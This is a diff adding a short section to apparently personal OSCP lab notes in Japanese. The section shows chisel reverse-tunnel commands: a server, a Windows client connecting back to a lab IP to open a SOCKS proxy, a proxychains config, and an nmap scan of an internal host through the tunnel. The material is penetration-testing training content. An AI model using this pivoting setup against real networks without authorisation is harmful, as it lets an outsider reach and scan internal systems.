@@ -620,3 +620,21 @@ dll ハイジャックなどでユーザを作成したときは、ローカル�
 ┌──(rnozaka㉿rnozaka)-[~/Documents/OSCP_A]
 └─$  7z e sitebackup3.zip 
 ```
+
+### chisel
+server
+```
+chisel server -p 8010 --reverse
+```
+client
+```
+chisel.exe client 192.168.45.190:8010 R:1080:socks
+```
+/etc/proxychains
+```
+socks5 127.0.0.1 1080
+```
+実行コマンド
+```
+proxychains -q nmap 10.10.174.140
+```
